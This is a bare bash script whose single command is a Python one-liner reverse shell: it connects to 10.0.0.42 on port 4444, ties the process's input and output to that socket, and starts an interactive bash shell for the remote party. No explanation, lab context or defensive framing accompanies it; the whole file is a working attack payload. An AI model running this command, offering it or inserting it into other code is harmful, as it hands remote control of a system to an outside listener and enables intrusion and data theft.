#!/usr/bin/env bash
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.42',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/bash','-i'])"
